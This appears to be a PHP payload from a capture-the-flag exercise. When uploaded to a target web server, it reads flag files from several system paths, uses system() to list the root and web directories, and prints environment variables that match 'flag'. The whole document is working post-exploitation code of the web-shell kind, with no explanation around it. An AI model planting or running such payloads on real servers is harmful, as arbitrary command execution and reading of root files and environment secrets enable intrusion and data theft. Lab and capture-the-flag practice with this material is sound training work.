<?php
foreach(['/flag','/flag.txt','/root/flag.txt','/var/www/html/flag.txt','/flag.php'] as $f){
  if(is_readable($f)) echo "$f => ".file_get_contents($f)."\n";
}
echo "--LS root--\n"; system('ls -la / 2>/dev/null');
echo "--LS webroot--\n"; system('ls -la /var/www/html 2>/dev/null');
echo "--ENV--\n"; system('env 2>/dev/null | grep -iE "flag|FLAG"');
